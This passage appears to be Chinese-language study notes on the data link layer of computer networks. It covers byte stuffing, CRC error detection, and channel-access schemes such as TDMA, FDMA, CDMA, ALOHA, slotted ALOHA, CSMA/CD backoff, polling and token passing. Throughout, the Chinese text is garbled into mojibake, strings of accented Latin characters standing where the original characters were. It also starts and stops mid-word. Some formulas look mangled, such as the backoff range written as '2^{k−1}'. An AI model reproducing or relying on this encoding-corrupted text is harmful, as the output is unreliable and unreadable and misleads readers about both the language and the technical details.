stuffing)ï¼š\nå‘é€ç«¯çš„æ•°æ®é“¾è·¯å±‚åœ¨æ•°æ®ä¸­å‡ºç°æ§åˆ¶å­—ç¬¦â€œSOHâ€æˆ–â€œEOTâ€çš„å‰é¢æ’å…¥ä¸€ä¸ªè½¬ä¹‰å­—ç¬¦â€œESCâ€ åœ¨æ¥æ”¶ç«¯çš„æ•°æ®é“¾è·¯å±‚åœ¨æŠŠæ•°æ®é€å¾€ç½‘ç»œå±‚ä¹‹å‰åˆ é™¤è¿™ä¸ªæ’å…¥çš„è½¬ä¹‰å­—ç¬¦ å¦‚æœè½¬ä¹‰å­—ç¬¦ä¹Ÿå‡ºç°åœ¨æ•°æ®å½“ä¸­ï¼Œé‚£ä¹ˆè§£å†³æ–¹æ³•ä»ç„¶æ˜¯åœ¨è½¬ä¹‰å­—ç¬¦çš„å‰é¢æ’å…¥ä¸€ä¸ªè½¬ä¹‰å­—ç¬¦ï¼ˆå½“æ¥æ”¶ç«¯æ”¶åˆ°è¿ç»­çš„ä¸¤ä¸ªè½¬ä¹‰å­—ç¬¦æ—¶ï¼Œå°±åˆ é™¤å…¶ä¸­å‰é¢çš„ä¸€ä¸ªï¼‰ å·®é”™æ£€æµ‹ 1 å¯èƒ½ä¼šå˜æˆ 0ï¼Œè€Œ 0 ä¹Ÿå¯èƒ½å˜æˆ 1ã€‚è¿™å°±å«åšæ¯”ç‰¹å·®é”™\nåœ¨ä¿¡å™ªè¶Šå°çš„æƒ…å†µä¸‹ï¼Œè¯¯ç ç‡ BER (Bit Error Rate)è¶Šé«˜\nç›¸è¾ƒäºæœ‰çº¿ä¿¡é“ï¼Œæ— çº¿ç½‘ç»œä¼šé‡åˆ°åƒå¤šä¸ª WiFi å¹²æ‰°ç­‰çš„æƒ…å†µï¼Œè¯¯ç ç‡æ¯”è¾ƒé«˜\nåœ¨é“¾è·¯å±‚ä¸­ï¼Œå¹¿æ³›ä½¿ç”¨å¾ªç¯å†—ä½™æ£€éªŒï¼ˆCRCï¼ŒCyclic Redundancy Checkï¼‰çš„æ£€é”™æŠ€æœ¯\nCRC æ£€é”™æŠ€æœ¯ CRC è¿ç®—å°±æ˜¯åœ¨æ•°æ® M çš„åé¢æ·»åŠ ä¾›å·®é”™æ£€æµ‹ç”¨çš„ n ä½å†—ä½™ç ï¼Œç„¶åæ„æˆä¸€ä¸ªå¸§å‘é€å‡ºå»ï¼Œä¸€å…±å‘é€$(k + n)$ä½ï¼Œè¿™ç§ä¸ºäº†è¿›è¡Œæ£€é”™è€Œæ·»åŠ çš„å†—ä½™ç å¸¸ç§°ä¸ºå¸§æ£€éªŒåºåˆ— FCS (Frame Check Sequence)\nè®¡ç®—æ–¹æ³• CRC æ˜¯åŸºäºæ¨¡äºŒè¿ç®—çš„\næ¨¡äºŒåŠ æ³•å’Œæ¨¡äºŒå‡æ³•ç›¸å½“äºå¼‚æˆ–è¿ç®—ï¼Œä»–ä»¬æ˜¯ä¸€å›äº‹ æ¨¡äºŒä¹˜æ³•ç›¸å½“äºä¸”è¿ç®— æ¨¡äºŒé™¤æ³•ç›¸å½“äºæ¨¡äºŒä¹˜æ³•çš„é€†è¿ç®— ä¹˜æ³•å’Œé™¤æ³•ç›¸å½“äºå¤šä¸ªåŠ æ³•å’Œå¤šä¸ªå‡æ³•\nåœ¨å‘é€ç«¯ï¼š ç”¨äºŒè¿›åˆ¶çš„æ¨¡ 2 è¿ç®—è¿›è¡Œ$2^n$ ä¹˜ M çš„è¿ç®—ï¼Œè¿™ç›¸å½“äºåœ¨ M åé¢æ·»åŠ  n ä¸ª 0ã€‚å¾—åˆ°çš„$(k + n)$ ä½çš„æ•°é™¤ä»¥æ”¶å‘åŒæ–¹äº‹å…ˆå•†å®šçš„é•¿åº¦ä¸º $(n + 1)$ä½çš„é™¤æ•° Pï¼Œå¾—å‡ºå•†æ˜¯ Q è€Œä½™æ•°æ˜¯ Rï¼ˆn ä½ï¼Œæ¯” P å°‘ä¸€ä½ï¼‰ï¼Œä½™æ•° R å°±ä½œä¸ºä½™ç æ‹¼æ¥åœ¨æ•°æ® M çš„åé¢å‘é€å‡ºå»\nåœ¨æ¥æ”¶ç«¯ï¼š æŠŠæ”¶åˆ°çš„æ¯ä¸€ä¸ªå¸§éƒ½é™¤ä»¥åŒæ ·çš„é™¤æ•° Pï¼ˆæ¨¡ 2 è¿ç®—ï¼‰ï¼Œç„¶åæ£€æŸ¥å¾—åˆ°çš„ä½™æ•° Rï¼Œå¦‚æœåœ¨ä¼ è¾“è¿‡ç¨‹ä¸­æ— å·®é”™ï¼Œé‚£ä¹ˆç»è¿‡ CRC æ£€éªŒåå¾—å‡ºçš„ä½™æ•° R è‚¯å®šæ˜¯ 0ï¼Œå°±æ¥æ”¶ï¼›è‹¥ä½™æ•° R â‰  0ï¼ˆæ­£ç¡®çš„æ¦‚ç‡å¾ˆå°å¾ˆå°ï¼‰ï¼Œåˆ™åˆ¤å®šè¿™ä¸ªå¸§æœ‰å·®é”™ï¼ˆä½†æ— æ³•ç¡®å®šç©¶ç«Ÿæ˜¯å“ªä¸€ä½æˆ–å“ªå‡ ä½å‡ºç°äº†å·®é”™ï¼‰ï¼Œå°±ä¸¢å¼ƒ\nå› ä¸ºåŠ æ³•å’Œå‡æ³•æ˜¯ä¸€å›äº‹ï¼Œæ‰€ä»¥$2^nM=QP+R=QP+CRC$ï¼Œä½†æ˜¯å‘é€çš„æ˜¯$2^nM+CRC=QP+CRC+CRC=QP+CRC-CRC=QP$ï¼Œæ‰€ä»¥å¦‚æœæ²¡æœ‰é”™ï¼Œé‚£ä½™æ•°å¿…ä¸º 0\nåœ¨æ•°æ®é“¾è·¯å±‚è‹¥ä»…ä»…ä½¿ç”¨å¾ªç¯å†—ä½™æ£€éªŒ CRC å·®é”™æ£€æµ‹æŠ€æœ¯ï¼Œåˆ™åªèƒ½åšåˆ°å¯¹å¸§çš„æ— å·®é”™æ¥å—ï¼Œå³ï¼šâ€œå‡¡æ˜¯æ¥æ”¶ç«¯æ•°æ®é“¾è·¯å±‚æ¥å—çš„å¸§ï¼Œæˆ‘ä»¬éƒ½èƒ½ä»¥éå¸¸æ¥è¿‘äº 1 çš„æ¦‚ç‡è®¤ä¸ºè¿™äº›å¸§åœ¨ä¼ è¾“è¿‡ç¨‹ä¸­æ²¡æœ‰äº§ç”Ÿå·®é”™â€ã€‚ æ¥æ”¶ç«¯ä¸¢å¼ƒçš„å¸§è™½ç„¶æ›¾æ”¶åˆ°äº†ï¼Œä½†æœ€ç»ˆè¿˜æ˜¯å› ä¸ºæœ‰å·®é”™è¢«ä¸¢å¼ƒï¼Œå³æ²¡æœ‰è¢«æ¥å—ã€‚ä»¥ä¸Šæ‰€è¿°çš„å¯ä»¥è¿‘ä¼¼åœ°è¡¨è¿°ä¸ºï¼ˆé€šå¸¸éƒ½æ˜¯è¿™æ ·è®¤ä¸ºï¼‰ï¼šâ€œå‡¡æ˜¯æ¥æ”¶ç«¯æ•°æ®é“¾è·¯å±‚æ¥å—çš„å¸§å‡æ— å·®é”™â€\næ³¨æ„äº‹é¡¹ï¼š\né€‰æ‹©é™¤æ•°ï¼Œå¯ä»¥éšæœºé€‰æ‹©ï¼Œä¹Ÿå¯ä»¥æŒ‰ç…§æ—¢å®šæ ‡å‡†é€‰æ‹©ï¼ˆæŒ‰ç…§å›½é™…é€šè¡Œæ ‡å‡†é€‰æ‹©ï¼Œæœ€é«˜ä½å’Œæœ€ä½ä¸ºå¿…é¡»ä¸º 1ï¼‰ã€‚é™¤æ•°å¾€å¾€ä¹Ÿç”¨å¤šé¡¹å¼è¡¨ç¤ºï¼Œæ‰€ä»¥ CRC åˆç§°å¤šé¡¹å¼ç¼–ç æ–¹æ³•ï¼Œè¿™ä¸ªå¤šé¡¹å¼ä¹Ÿç§°ä¸ºç”Ÿæˆå¤šé¡¹å¼ ä½™æ•°çš„ä½æ•°ä¸€å®šæ˜¯æ¯”é™¤æ•°ä½æ•°å°ä¸€ä½ï¼Œå³ä½¿å‰é¢å…¨æ˜¯ 0ï¼Œä¹Ÿä¸è¦çœç•¥ å¸§æ£€éªŒåºåˆ— FCS â€“ Frame Check Sequenceã€‚è¿™é‡Œçš„å†—ä½™ç å°±ç§°ä¸º FCSï¼Œç”±å…¶ä»–çš„æ ¡éªŒæ–¹æ³•ï¼Œä¹Ÿèƒ½å¾—åˆ°å¯¹åº”çš„ FCS å¹¶ä¸èƒ½åšåˆ°å¯é ä¼ è¾“ ï¼Œå¿…é¡»åŠ ä¸Šç¡®è®¤å’Œé‡ä¼ æœºåˆ¶ï¼ˆå…¶ä»–å±‚åè®®è´Ÿè´£ï¼‰ ä»‹è´¨è®¿é—®æ§åˆ¶ï¼ˆMACï¼‰\u0026ndash;ä¸“ç”¨äºå¹¿æ’­ä¿¡é“ å¤šè·¯è®¿é—® å¹¿æ’­ä¿¡é“ä¸­ï¼Œå¾€å¾€åªæœ‰ 1 æ¡å…±äº«çš„å¹¿æ’­ä¿¡é“ (single shared broadcast channel)ï¼Œå´æœ‰ä¸¤ä¸ªæˆ–å¤šä¸ªèŠ‚ç‚¹ï¼Œå¯èƒ½å‘ç”ŸåŒæ—¶çš„æ•°æ®ä¼ è¾“\nè¿™ä¼šå¯¼è‡´å¹²æ¶‰çš„å‘ç”Ÿï¼ˆæˆ–â€œç¢°æ’ collisionâ€ï¼‰ï¼šå¦‚æœä¸€ä¸ª node åŒæ—¶éœ€è¦å‘é€ä¸¤ä¸ªä¿¡å·ï¼Œæˆ–è€…å¤šä¸ª node éœ€è¦åŒæ—¶å‘é€å¤šä¸ªä¿¡å·ã€‚\nå¦‚ä½•ä½¿ä¼—å¤šç”¨æˆ·èƒ½å¤Ÿåˆç†è€Œæ–¹ä¾¿åœ°å…±äº«é€šä¿¡åª’ä½“èµ„æºï¼Œè¿™åœ¨æŠ€æœ¯ä¸Šæœ‰ä¸¤ç§æ–¹æ³•ï¼š\né™æ€åˆ’åˆ†ä¿¡é“ï¼šé¢‘åˆ†å¤ç”¨ã€æ—¶åˆ†å¤ç”¨ã€æ³¢åˆ†å¤ç”¨å’Œç åˆ†å¤ç”¨ç­‰ï¼Œä¸é€‚åˆå±€åŸŸç½‘ åŠ¨æ€åª’ä½“æ¥å…¥æ§åˆ¶ï¼Œåˆç§°ä¸ºå¤šç‚¹æ¥å…¥(multiple access)ï¼ŒåŒ…æ‹¬éšæœºæ¥å…¥å’Œå—æ§æ¥å…¥ åˆ†å¸ƒå¼ç®—æ³• â€“ æ¯ä¸ªèŠ‚ç‚¹ä¸Šåˆ†åˆ«å†³å®šæ˜¯å¦åº”è¯¥å‘é€ä¿¡å· â€œhow nodes share channelâ€â€œä½•æ—¶å¯ä»¥å‘é€ä¿¡å·â€ æ³¨æ„ï¼Œæ‰€æœ‰çš„åè®®é€šä¿¡ç”¨åˆ°çš„ä¹Ÿæ˜¯è¯¥å¹¿æ’­ä¿¡é“è‡ªèº«ï¼å³ï¼Œæ²¡æœ‰é¢å¤–çš„ä¿¡é“ç”¨äºåè°ƒè¿™äº›èŠ‚ç‚¹ã€‚ å…±æœ‰ä¸‰ç§ä¿¡é“å¤ç”¨çš„åè®®ï¼š\nä¿¡é“åˆ’åˆ† ï¼ˆchannel partitioningï¼‰ å°†ä¿¡é“åˆ†ä¸ºå°å—ï¼ˆä¾‹å¦‚åˆ†æˆ time slotsã€æ ¹æ®é¢‘ç‡åˆ’åˆ†ã€é‡‡ç”¨ä¸åŒçš„ç¼–ç è°ƒåˆ¶ä¿¡å·ç­‰ï¼‰ æ¯ä¸€å°å—è¢«ä¸€ä¸ªèŠ‚ç‚¹ç‹¬äº« TDMA TDMAï¼štime division multiple access æ—¶åˆ†å¤ç”¨\nèŠ‚ç‚¹åˆ†è½®ï¼ˆin â€œroundsâ€ï¼‰ä½¿ç”¨ä¿¡é“ï¼šæ¯ä¸ªèŠ‚ç‚¹åœ¨æ¯ä¸€è½®éƒ½ä¼šè·å¾—å®šé•¿çš„ slotï¼ˆé€šå¸¸ slot çš„é•¿åº¦ç­‰äºä¼ è¾“ packet çš„æ—¶é—´ï¼‰åˆ†é…ä½†æœªç”¨çš„ slot åˆ™ä¿æŒé—²ç½®\nä¾‹ï¼š6 ä¸ªèŠ‚ç‚¹ï¼ŒèŠ‚ç‚¹ 1ã€3ã€4 å‘é€æ•°æ®ï¼Œè€ŒèŠ‚ç‚¹ 2ã€5ã€6 ä¸å‘é€æ•°æ® FDMA FDMAï¼šfrequency division multiple access é¢‘åˆ†å¤ç”¨\nä¿¡é“çš„é¢‘è°±åˆ’åˆ†ä¸ºä¸åŒçš„é¢‘æ®µ,æ¯ä¸ªèŠ‚ç‚¹åˆ†é…ä½¿ç”¨å›ºå®šçš„é¢‘æ®µå‘é€æ•°æ®,å¯¹äºä¸å‘é€æ•°æ®çš„èŠ‚ç‚¹ï¼Œå¯¹åº”çš„é¢‘æ®µå³ä¸ºé—²ç½®çŠ¶æ€\nCDMA CDMAï¼šcode division multiple access ç åˆ†å¤ç”¨\nå°†éœ€è¦å‘é€çš„ä¿¡å·é€šè¿‡ä¸åŒçš„ç¼–ç è¿›è¡Œè°ƒåˆ¶ï¼Œç„¶åå¤ç”¨å¹¿æ’­ä¿¡é“\néšæœºæ¥å…¥ ï¼ˆrandom accessï¼‰ ä¸åˆ’åˆ†ä¿¡é“ï¼Œå…è®¸ç¢°æ’ï¼š\nå¦‚æœæ°å·§æœ‰ä¸¤ä¸ªæˆ–æ›´å¤šçš„ç”¨æˆ·åœ¨åŒä¸€æ—¶åˆ»å‘é€ä¿¡æ¯ï¼Œé‚£ä¹ˆåœ¨å…±äº«åª’ä½“ä¸Šå°±è¦äº§ç”Ÿç¢°æ’,ä½¿å¾—è¿™äº›ç”¨æˆ·çš„å‘é€éƒ½å¤±è´¥ é—®é¢˜åœ¨äºï¼š\nå°è¯•ä»â€œç¢°æ’â€ä¸­â€œæ¢å¤â€ å¦‚ä½•é¿å…ç¢°æ’å‘ç”Ÿå’Œç¢°æ’å‘ç”Ÿæ€ä¹ˆåŠ ALOHA åè®®â€”â€”æœ€æ—©çš„éšæœºè®¿é—®æ–¹æ³• çº¯ ALOHA åªè¦æœ‰ç«™ç‚¹éœ€è¦å‘é€å¸§ï¼Œå®ƒå°±å‘é€å¸§\nçº¯ ALOHA ä¾èµ–äºæ¥æ”¶æ–¹çš„ç¡®è®¤ï¼Œå¦‚æœæ¥æ”¶æ–¹ç¡®å®æ”¶åˆ°äº†å¸§ï¼Œå®ƒå°±ä¼šå‘å‘é€æ–¹å‘é€ç¡®è®¤ï¼Œåªæœ‰å½“å‘é€æ–¹æ”¶åˆ°è¯¥ç¡®è®¤é€šçŸ¥åï¼Œå‘é€æ–¹æ‰åˆ¤å®šè¯¥å¸§æˆåŠŸå‘é€ï¼Œå¦åˆ™å°±è¦é‡å‘\nä½†æ˜¯ï¼Œå¦‚æœå¤šä¸ªåŒæ—¶å‘é€å¤±è´¥çš„ç«™ç‚¹åŒæ—¶é‡å‘ï¼Œé‚£ä¹ˆè¿˜æ˜¯å¾ˆå¯èƒ½å‘é€å¤±è´¥ã€‚æ‰€ä»¥ï¼Œä¸ºäº†é¿å…å†ä¸€æ¬¡å µè½¦ï¼Œçº¯ ALOHA æŒ‡å®šç«™ç‚¹é‡å‘ä¹‹å‰éšæœºç­‰å¾…ä¸€æ®µæ—¶é—´ï¼ˆè¡¥å¿æ—¶é—´ $T_{B}$ ï¼‰ï¼Œç›¸å½“äºé”™å³°å¼€è½¦\nåŒæ—¶ï¼Œå¦‚æœç«™ç‚¹å¤šæ¬¡å¤±è´¥ï¼Œç«™ç‚¹å°±æš‚æ—¶èººå¹³ä¸å‘é€äº†ï¼Œç­‰åˆ°ä»¥åå†å‘é€è¯¥å¸§ï¼Œç›¸å½“äºæ‘†çƒ‚\næˆ‘ä»¬ç¨‹è„†å¼±æ—¶é—´ä¸ºå¯èƒ½ç¢°æ’çš„æ—¶é—´é•¿åº¦ï¼Œåˆ™çº¯ ALOHA è™½å¼±æ—¶é—´ä¸º 2T\nslotted ALOHA æ—¶é—´è½´åˆ’åˆ†ä¸ºç­‰é•¿çš„æ—¶éš™ï¼ˆslotsï¼‰ï¼Œé€šå¸¸æ˜¯ä¼ è¾“ä¸€å¸§çš„æ—¶é—´ï¼Œè€Œä¸”èŠ‚ç‚¹å‡åªåœ¨æ—¶éš™å¼€å§‹çš„æ—¶å€™ä¼ è¾“ èŠ‚ç‚¹çš„è¡Œä¸ºæ˜¯åŒæ­¥çš„ å¦‚æœè¶…è¿‡ä¸¤ä¸ªèŠ‚ç‚¹åœ¨ä¸€ä¸ªæ—¶éš™åŒæ—¶ä¼ è¾“ï¼Œåˆ™æ‰€æœ‰èŠ‚ç‚¹èƒ½ä¾¦æµ‹åˆ°ç¢°æ’ æ‰€ä»¥æ—¶éš™ ALOHA æ˜¯å¯¹çº¯ Aloha çš„ä¸€ç§æ”¹è¿›ï¼Œå…¶åŸºæœ¬æ€æƒ³æ˜¯æŠŠæ—¶é—´åˆ†æˆè‹¥å¹²ä¸ªç›¸åŒçš„æ—¶é—´ç‰‡ï¼Œæ‰€æœ‰ç”¨æˆ·åœ¨æ—¶é—´ç‰‡å¼€å§‹æ—¶åˆ»åŒæ­¥æ¥å…¥ç½‘ç»œä¿¡é“ï¼Œè‹¥å‘ç”Ÿå†²çªï¼Œåˆ™å¿…é¡»ç­‰åˆ°ä¸‹ä¸€ä¸ªæ—¶é—´ç‰‡å¼€å§‹æ—¶åˆ»å†å‘é€ï¼Œè¿™æ ·å°±åªæœ‰å®Œå…¨ç¢°æ’æ²¡æœ‰éƒ¨åˆ†ç¢°æ’ï¼Œè„†å¼±æ—¶é—´ä» 2T å‡å°‘åˆ° T\næ­¥éª¤ï¼š\nå½“èŠ‚ç‚¹è¿›å…¥é˜…è¯»å™¨çš„è¯†åˆ«èŒƒå›´åï¼ŒèŠ‚ç‚¹è‡ªèº«æºå¸¦çš„éšæœºæ•°å‘ç”Ÿå™¨äº§ç”Ÿä¸€éšæœºæ•°ï¼ŒèŠ‚ç‚¹æŒ‰æ­¤éšæœºæ•°é€‰æ‹©æ—¶éš™ï¼Œè‹¥æŸ¥è¯¢æ—¶çš„æ—¶éš™æ•°ä¸èŠ‚ç‚¹é€‰æ‹©çš„æ—¶éš™ç›¸åŒ¹é…æ—¶èŠ‚ç‚¹å³å“åº”ï¼Œå¹¶ç«‹å³å‘é€è‡ªèº«çš„æ•°æ®ä¿¡æ¯ è‹¥æ—¶éš™å†…æœ‰ç¢°æ’æ—¶ï¼Œé˜…è¯»å™¨å°†ç»ˆæ­¢èŠ‚ç‚¹ç»§ç»­å‘é€ä¿¡æ¯å¹¶ä»¤èŠ‚ç‚¹ç­‰å¾…ä¸‹ä¸€æ¬¡æŸ¥è¯¢ï¼Œè¯¥èŠ‚ç‚¹åœ¨ä»¥åçš„æ¯ä¸€ä¸ªæ—¶éš™å‡ä»¥æ¦‚ç‡ ğ‘ è¿›è¡Œé‡ä¼ ï¼Œç›´è‡³ä¼ è¾“æˆåŠŸ ï¼ˆC-collide,E-empty,S-successï¼‰\nä¼˜ç‚¹ï¼š\næ¯ä¸ªæ—¶éš™ä¸­ï¼Œéƒ½æœ‰ä¸€ä¸ªèŠ‚ç‚¹å¯ä»¥ä¸€ç›´ä»¥å…¨é€Ÿè¿›è¡Œä¼ è¾“ã€‚ é«˜åº¦åˆ†å¸ƒå¼ç®—æ³•ï¼šåªéœ€æŠŠæ‰€æœ‰èŠ‚ç‚¹çš„æ—¶éš™è¿›è¡ŒåŒæ­¥å³å¯ï¼Œå…¶ä½™å…¨éƒ¨æ˜¯é€šè¿‡èŠ‚ç‚¹è‡ªè¡Œæ¢æµ‹è§£å†³ï¼ˆä¸åƒçº¯ ALOHA è¦æ”¶åˆ°ä¸€ä¸ªç¡®è®¤ï¼Œç„¶åè¿›è¡Œå†³ç­–ï¼‰ ç®—æ³•ååˆ†ç®€å• ç¼ºç‚¹ï¼š\nç¢°æ’æµªè´¹äº†å¾ˆå¤šæ—¶éš™ï¼Œä¹Ÿä¼šæœ‰å¾ˆå¤šæ—¶éš™æ˜¯é—²ç½®çš„ éœ€è¦ä¸€ä¸ªæ—¶éš™å»ä¾¦æµ‹ç¢°æ’çš„å‘ç”Ÿã€‚ä½†äº‹å®ä¸ŠèŠ‚ç‚¹å¯èƒ½åªéœ€è¦æ›´å°‘çš„æ—¶é—´å°±å¯ä»¥ä¾¦æµ‹ç¢°æ’ éœ€è¦æ—¶é’ŸåŒæ­¥ï¼ˆä¸ç„¶æ—¶éš™çš„åˆ’åˆ†å°±æ²¡æœ‰ç”¨äº†ï¼‰ æ•ˆç‡ä¸é«˜\rè½½æ³¢ä¾¦å¬å¤šç‚¹æ¥å…¥/ç¢°æ’æ£€æµ‹ï¼ˆCSMA/CDï¼‰ åŸºæœ¬ç­–ç•¥ CSMA/CD ä»…ç”¨äºæœ‰çº¿ç½‘ç»œï¼Œä¸ç”¨äºæ— çº¿ç½‘ç»œï¼›æ— çº¿ç½‘ç»œä½¿ç”¨ CSMA/CA\nå‘é€æ•°æ®å‰å…ˆç›‘å¬å¹¿æ’­ä¿¡é“ï¼Œå¦‚æœä¿¡é“ç©ºé—²ï¼Œåˆ™å‘é€æ•´ä¸ªå¸§ï¼›å¦‚æœä¿¡é“æ­£å¿™ï¼Œåˆ™å»¶è¿Ÿå‘é€\nâ€œç¢°æ’æ£€æµ‹â€å°±æ˜¯è®¡ç®—æœºè¾¹å‘é€æ•°æ®è¾¹æ£€æµ‹ä¿¡é“ä¸Šçš„ä¿¡å·ç”µå‹å¤§å°ï¼Œå°±æ˜¯è¿™ä¸ª CSMA çš„ä¾¦å¬æ–¹å¼ï¼ˆèŠ‚ç‚¹åŒæ—¶åœ¨æ€»çº¿ä¸Šå‘é€æ•°æ®æ—¶ï¼Œæ€»çº¿ä¸Šçš„ä¿¡å·ç”µå‹æ‘†åŠ¨å€¼å°†ä¼šå¢å¤§ï¼ˆäº’ç›¸å åŠ ï¼‰ï¼‰\nç„¶åæˆ‘ä»¬å¯ä»¥è®¾ç½®ä¸€ä¸ªé—¨é™å€¼ï¼Œå½“ç”µå‹è¶…è¿‡é—¨é™å€¼çš„æ—¶å€™ï¼Œæˆ‘ä»¬å°±åˆ¤æ–­å®ƒå‘ç”Ÿäº†ç¢°æ’\nå› ä¸ºæœ‰çº¿ç½‘ç»œä¸­ä¿¡å·ç›¸å¯¹äºå™ªå£°æ›´æ˜æ˜¾ï¼Œæ‰€ä»¥è¿™ç§ä¾¦å¬æ–¹å¼æ¯”è¾ƒæœ‰æ•ˆï¼›ä½†åœ¨æ— çº¿ç½‘ç»œä¸­å¤ªå¤šå™ªå£°äº†ï¼Œè¿™ç§æ–¹å¼å°±ä¸ç®¡ç”¨äº†\nä¸€æ—¦å‘ç°æ€»çº¿ä¸Šå‡ºç°äº†ç¢°æ’ï¼Œæ€»çº¿ä¸Šä¼ è¾“çš„ä¿¡å·å°±äº§ç”Ÿäº†ä¸¥é‡çš„å¤±çœŸï¼Œæ— æ³•ä»ä¸­æ¢å¤å‡ºæœ‰ç”¨çš„ä¿¡æ¯ï¼Œå°±è¦ç«‹å³åœæ­¢å‘é€ï¼Œç„¶åç­‰å¾…ä¸€æ®µéšæœºæ—¶é—´åå†æ¬¡å‘é€ã€‚\nç¢°æ’æ£€æµ‹ æœ€å…ˆå‘é€æ•°æ®å¸§çš„ç«™ï¼Œåœ¨å‘é€æ•°æ®å¸§åè‡³å¤šç»è¿‡æ—¶é—´ 2ğœï¼ˆä¸¤å€çš„ç«¯åˆ°ç«¯å¾€è¿”æ—¶å»¶ï¼‰å°±å¯çŸ¥é“å‘é€çš„æ•°æ®å¸§æ˜¯å¦é­å—äº†ç¢°æ’ã€‚ ä»¥å¤ªç½‘çš„ ç«¯åˆ°ç«¯å¾€è¿”æ—¶å»¶ 2ğœ ç§°ä¸ºäº‰ç”¨æœŸ(contention period) ï¼Œåˆç§°ä¸ºç¢°æ’çª—å£(collision window)ã€‚ åªæœ‰ç»è¿‡äº‰ç”¨æœŸè¿™æ®µæ—¶é—´è¿˜æ²¡æœ‰æ£€æµ‹åˆ°ç¢°æ’ï¼Œæ‰èƒ½è‚¯å®šè¿™æ¬¡å‘é€ä¸ä¼šå‘ç”Ÿç¢°æ’ã€‚ ç”±ä¸Šå›¾æ˜“çŸ¥ï¼šä¸€ä¸ªç«™ä¸å¯èƒ½åŒæ—¶è¿›è¡Œå‘é€å’Œæ¥æ”¶ï¼ˆä½†å¿…é¡»è¾¹å‘é€è¾¹ç›‘å¬ä¿¡é“ï¼‰ï¼Œå½“ B å·²ç»æ”¶åˆ° A å‘é€çš„æ•°æ®ï¼Œå°±å‡†å¤‡ä¸€ç›´æ¥æ”¶ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œåªæœ‰åœ¨äº‰ç”¨æœŸå†…ï¼ŒB æ²¡æœ‰å‘é€æ•°æ®ï¼ŒB æ‰èƒ½é¡ºåˆ©å¼€å§‹æ¥æ”¶ï¼ŒA æ‰ç®—é€šè¿‡äº†è€ƒéªŒ\né‡ä¼ æœºåˆ¶ æˆªæ–­äºŒè¿›åˆ¶æŒ‡æ•°é€€é¿(truncated binary exponential backoff)ï¼š\nè®©å‘ç”Ÿç¢°æ’çš„ç«™åœ¨åœæ­¢å‘é€æ•°æ®åï¼Œç­‰å¾…ä¿¡é“å˜ä¸ºç©ºé—²åæ¨è¿Ÿï¼ˆè¿™å«åšé€€é¿ï¼‰ä¸€ä¸ªéšæœºçš„æ—¶é—´\n$k = Min[é‡ä¼ æ¬¡æ•°, 10]$ $[0,1,â€¦, 2^{k âˆ’1}]$ä¸­éšæœºå–ä¸€ä¸ªæ•°ä¹˜ä»¥äº‰ç”¨æœŸ$Ï„$å°±æ˜¯éœ€è¦ç­‰å¾…çš„æ—¶é—´\nå½“é‡ä¼ è¾¾ 16 æ¬¡ä»ä¸èƒ½æˆåŠŸæ—¶ï¼Œåˆ™ä¸¢å¼ƒè¯¥å¸§ï¼Œå¹¶å‘é«˜å±‚æŠ¥å‘Šã€‚\nä½¿ç”¨ä¸Šè¿°é€€é¿ç®—æ³•å¯ä½¿é‡ä¼ éœ€è¦æ¨è¿Ÿçš„å¹³å‡æ—¶é—´éšé‡ä¼ æ¬¡æ•°è€Œå¢å¤§ï¼ˆè¿™ä¹Ÿç§°ä¸ºåŠ¨æ€é€€é¿ï¼‰ï¼Œå› è€Œå‡å°å‘ç”Ÿç¢°æ’çš„æ¦‚ç‡ï¼Œæœ‰åˆ©äºæ•´ä¸ªç³»ç»Ÿçš„ç¨³å®š\nè„†å¼±æ—¶é—´ ä¼˜ç¼ºç‚¹ ä¼˜ç‚¹ï¼š\nç®€å• ä¾¿å®œ å®Œå…¨å»ä¸­å¿ƒåŒ– ç¼ºç‚¹ï¼š\nä½¿ç”¨ CSMA/CD åè®®çš„ä»¥å¤ªç½‘ä¸èƒ½è¿›è¡Œå…¨åŒå·¥é€šä¿¡è€Œåªèƒ½è¿›è¡ŒåŒå‘äº¤æ›¿é€šä¿¡ï¼ˆåŠåŒå·¥é€šä¿¡ï¼‰ã€‚ æ¯ä¸ªç«™åœ¨å‘é€æ•°æ®ä¹‹åçš„ä¸€å°æ®µæ—¶é—´å†…ï¼Œå­˜åœ¨ç€é­é‡ç¢°æ’çš„å¯èƒ½æ€§ï¼ˆäº‰ç”¨æœŸï¼‰ å—æ§æ¥å…¥ï¼ˆtaking turnsï¼‰ ç”¨æˆ·ä¸èƒ½éšæœºåœ°å‘é€ä¿¡æ¯è€Œå¿…é¡»æœä»ä¸€å®šçš„æ§åˆ¶ èŠ‚ç‚¹è½®æµå‘é€ä¿¡æ¯ å…¸å‹ä»£è¡¨æœ‰ï¼š\nåˆ†æ•£æ§åˆ¶çš„ä»¤ç‰Œç¯å±€åŸŸç½‘ é›†ä¸­æ§åˆ¶çš„å¤šç‚¹çº¿è·¯æ¢è¯¢(polling)ï¼Œæˆ–ç§°ä¸ºè½®è¯¢ Taking turns è½®æµæ¥å…¥ è®©å—æ§çš„èŠ‚ç‚¹è½®æµå‘é€å°±ä¸ä¼šç¢°æ’äº†\nè½®è¯¢ polling ä¸»èŠ‚ç‚¹ç®¡ç†æ¬¡èŠ‚ç‚¹ï¼Œå†³å®šä»–ä»¬ä»€ä¹ˆæ—¶å€™è½®æµå‘é€æ•°æ®ï¼ˆä¸»èŠ‚ç‚¹éœ€è¦å…·å¤‡ä¸€å®šæ™ºèƒ½ï¼Œè€Œæ¬¡èŠ‚ç‚¹ä¸éœ€è¦ï¼‰ï¼Œè¿™ç§æ–¹æ³•ç§°ä¸ºè½®è¯¢\nå­˜åœ¨è½®è¯¢çš„å¼€é”€ã€å»¶è¿Ÿã€å•ç‚¹æ•…éšœï¼ˆå³ master èŠ‚ç‚¹ï¼‰çš„é—®é¢˜\nä»¤ç‰Œä¼ é€’ token passing å—æ§çš„ä»¤ç‰Œä»ä¸€ä¸ªèŠ‚ç‚¹ä¾æ¬¡åºä¼ é€’åˆ°ä¸‹ä¸€ä¸ªèŠ‚ç‚¹ï¼Œæœ‰ä»¤ç‰Œçš„èŠ‚ç‚¹å³å¯å‘é€å¸§ï¼ˆå‡»é¼“ä¼ èŠ±ï¼Œä¼ åˆ°èŠ±çš„å°±å”±æ­Œï¼‰\nèŠ‚ç‚¹ä¹‹é—´ä¸å¿…ç‰©ç†åœ°è¿æˆç¯ï¼Œåªè¦é€»è¾‘ä¸Šæ¯ä¸ªèŠ‚ç‚¹éƒ½æœ‰å‰é©±å’Œåç»§å³å¯\nå­˜åœ¨ä¼ 